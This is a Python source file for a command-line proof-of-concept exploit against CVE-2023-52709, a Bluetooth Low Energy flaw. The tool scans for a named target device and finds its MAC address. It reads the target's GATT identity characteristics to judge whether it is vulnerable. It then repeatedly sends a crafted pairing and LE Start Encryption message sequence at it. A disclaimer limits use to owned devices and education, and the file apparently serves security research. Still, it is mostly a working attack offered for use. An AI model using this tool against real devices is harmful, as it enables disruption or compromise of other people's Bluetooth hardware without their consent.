#!/usr/bin/env python3
# Written by crypt0d1v3r (Zane Pelletier) and Kevin Mitchell
# Released as open source under GPLv3

import cmd
import os
import time
import re
import subprocess
from cve202352709 import BluetoothCtl

class CVE202352709CLI(cmd.Cmd):
    prompt = 'CVE202352709>> '
    intro = '''
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@*              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ .::---*@@-------------    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=:::::*@@@---------------:  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-#---------------  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@ @@  @@--:--------@@@@ -@@@@@---------  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@--------. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@--:::::--@@@@     @@@@-------- .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@  =@@  @-----------@@@      @@@-------. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@-------  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@--------------@@@  +@@@@-------#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:- :-----------+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@==.:----------:.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@  @------=--===--*@@=+.:------------  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@-----====  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@-@@@=====+=++++==*@@@   @@@@@@--=====+ =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@:@@@====+++++++++%@@@:::. @@@@=======+  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@::---.@@@==+=++=*  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**#%%%***#*#*@@@-==+@@@@@=+++++*+@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:-@@@@@++++++***#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-=#******+***#*@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%#%%%%@@@@@+*######*####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%#@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+@@@@*#@@@@@@@@@@@@@@@@@@@--@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**+@@***@@@@@@@@@@@@@@=%@@*--@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@***@@#**@@@**@@@++=@@++=@@@-=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@***@@@**@@@+++@@+++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**@@@*+@@@+++@@@+=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**@@@+++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@==+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-                          +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
        '''
    intro += '\nThis is the CVE2023-52709 PoC CLI. \nType "help" for available commands. \nDISCLAIMER: These ethical hacking tools are intended for educational purposes and awareness training sessions only. \nPerforming hacking attempts on devices that you do not own (without permission) is \nillegal! Do not attempt to gain access to or manipulate devices that you do not own. The authors of \nthis tool are not responsible for what you do with it, use at your own risk.'

    def __init__(self):
        super().__init__()
        self.bt = BluetoothCtl()
        self.discovered_devices = dict()
        self.gatt_characteristics_mapping = {
            'firmware_revision_string': '2a26',
            'model_number_string': '2a24',
            'serial_number_string': '2a25',
            'hardware_revision_string': '2a27',
            'software_revision_string': '2a28'
        }

    def do_help(self, arg):
        help_menu = '''
This is the CVE2023-52709 PoC CLI.
Valid commands:
    * get_target_mac {target device name} {scan timeout} -> Retrieves the MAC of a target device name.
    * execute_cve_on_target {target device name} -> Executes CVE2023-52709 PoC (Do not just do this 
    at random, please confirm your target MAC is correct first).
    * check_vulnerable_target {target mac address} {hci device} -> Checks if target device is vulnerable to 
    CVE2023-52709.
            '''
        print(help_menu)

    def send_sequence(self, mac_address:str):
        self.bt.send_pairing_request(mac_address)
        time.sleep(2)
        self.bt.send_pairing_confirm(mac_address)
        time.sleep(2)
        self.bt.send_pairing_random(mac_address)
        time.sleep(2)
        self.bt.send_le_start_encryption(mac_address)
        time.sleep(2)
        print("Sequence of pairing messages and LE Start Encryption sent successfully.")

    def send_stateless_command(self, command:str):
        process = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = process.communicate()
        return str(out).replace("b'", "").replace("'", "")

    def do_execute_cve_on_target(self, target_device_name:str):
        self.bt.power_on()
        time.sleep(1)

        try:
            found_device = True
            while True:
                mac_address = self.bt.find_device(target_device_name)
                print(f"Searching for device: {target_device_name}")
                if mac_address:
                    if not found_device:
                        print(f"Device '{target_device_name}' found with MAC address {mac_address}.")
                        found_device = True
                    self.send_sequence(mac_address)
                    print(f"Connected to {mac_address}.")
                    time.sleep(2)
                else:
                    if found_device:
                        print(f"Device '{target_device_name}' no longer found.")
                        found_device = False
                    print(f"Device '{target_device_name}' not found. Retrying...")
                    time.sleep(2) 
                    self.bt.power_on()
                    time.sleep(2) 
        except KeyboardInterrupt:
            print("Exiting...")
        finally:
            self.bt.power_off()

    def do_check_vulnerable_target(self, arg):
        target_mac_address, hcidev = arg.split()[0], arg.split()[1]
        # Have to use HCITOOL/GATTTOOL for this one
        devices = self.send_stateless_command("hcitool dev")
        if hcidev in devices:
            mac = ''
            for device in devices.split('\\n'):
                if hcidev in device:
                    mac = device.split('\\t')[-1]
            print(f"hcitool located bluetooth dongle with MAC {mac}")
            print(f"probing device {target_mac_address}")
            gatt_layer_characteristic_descriptions = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-desc")
            char_desc_map = dict((char, handle) for char, handle in [(x.split('=')[-1].split('-')[0][5:9], x.split('=')[1].split(',')[0].strip().replace('0x', '')) for x in gatt_layer_characteristic_descriptions.split('\\n')[:-1]])
            # Collect Model Number
            if self.gatt_characteristics_mapping['model_number_string'] in char_desc_map.keys():
                model_number = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['model_number_string']]}")
                model_number = bytearray.fromhex(model_number.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
                if 'Model Number' in model_number:
                    print(f'Model Number indicates device may be vulnerable to CVE 2023-52709')
            else:
                print(f"Common GATT characteristic hande for model number string not found on target {target_mac_address}")
            # Collect Serial Number
            if self.gatt_characteristics_mapping['serial_number_string'] in char_desc_map.keys():
                serial_number = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['serial_number_string']]}")
                serial_number = bytearray.fromhex(serial_number.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
                if 'Serial Number' in serial_number:
                    print(f'Serial Number indicates device may be vulnerable to CVE 2023-52709')
            else:
                print(f"Common GATT characteristic hande for serial number string not found on target {target_mac_address}")
            # Collect Firmware Revision
            if self.gatt_characteristics_mapping['firmware_revision_string'] in char_desc_map.keys():
                firmware_revision = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['firmware_revision_string']]}")
                firmware_revision = bytearray.fromhex(firmware_revision.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
                if 'Firmware Revision' in firmware_revision:
                    print(f'Frimware Revision indicates device may be vulnerable to CVE 2023-52709')
            else:
                print(f"Common GATT characteristic hande for firmware revision string not found on target {target_mac_address}")
            # Collect Hardware Revision
            if self.gatt_characteristics_mapping['hardware_revision_string'] in char_desc_map.keys():
                hardware_revision = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['hardware_revision_string']]}")
                hardware_revision = bytearray.fromhex(hardware_revision.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
                if 'Hardware Revision' in hardware_revision:
                    print(f'Hardware Revision indicates device may be vulnerable to CVE 2023-52709')
            else:
                print(f"Common GATT characteristic hande for hardware revision string not found on target {target_mac_address}")
            # Collect Software Revision
            if self.gatt_characteristics_mapping['software_revision_string'] in char_desc_map.keys():
                software_revision = self.send_stateless_command(f"gatttool -i {hcidev} -b {target_mac_address} --char-read -a 0x{char_desc_map[self.gatt_characteristics_mapping['software_revision_string']]}")
                software_revision = bytearray.fromhex(software_revision.split(': ')[-1].replace(' \\n', '').replace(' ', '')).decode()
                if 'Software Revision' in software_revision:
                    print(f'Software Revision indicates device may be vulnerable to CVE 2023-52709')
            else:
                print(f"Common GATT characteristic hande for software revision string not found on target {target_mac_address}")
        else:
            print("hcitool could not find specified attack device")

    def do_get_target_mac(self, arg):
        target_device_name, scan_timeout = arg.split()[0], int(arg.split()[1])
        print(f'Scanning for {target_device_name}')
        scan_output = self.bt.scan(timeout=scan_timeout)
        pattern = re.compile(r"((?:[0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}})\s+{}".format(re.escape(target_device_name)), re.IGNORECASE)
        match = pattern.search(scan_output)
        if match:
            MAC = match.group(1)
            print(f'Device {target_device_name} has a MAC of {MAC}, adding to discovered targets')  # Print the MAC address
            self.discovered_devices[target_device_name] = MAC
        return None
        
    def do_quit(self, line):
        """Exit the CLI."""
        return True

    def postcmd(self, stop, line):
        print()  # Add an empty line for better readability
        return stop

if __name__ == '__main__':
    CVE202352709CLI().cmdloop()